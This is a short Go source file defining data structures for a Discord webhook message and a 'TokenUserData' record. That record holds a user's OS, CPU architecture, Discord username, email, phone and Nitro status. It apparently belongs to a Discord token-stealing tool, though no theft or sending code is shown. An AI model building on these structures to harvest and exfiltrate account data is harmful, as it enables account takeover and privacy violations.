package utils

// structs
type UserData struct {
	Username string  `json:"username"`
	Content  string  `json:"content"`
	Embeds   []Embed `json:"embeds"`
}

type Field struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

// Embed reprezentuje wbudowany obiekt w webhooku Discord
type Embed struct {
	Fields []Field `json:"fields"`
}

type TokenUserData struct {
	DisplayName  string `json:"displayName"`
	OsName       string `json:"osName"`
	CpuArch      string `json:"cpuArch"`
	DiscordUser  string `json:"discordUser"`
	DiscordEmail string `json:"discordEmail"`
	DiscordPhone string `json:"discordPhone"`
	DiscordNitro string `json:"discordNitro"`
}
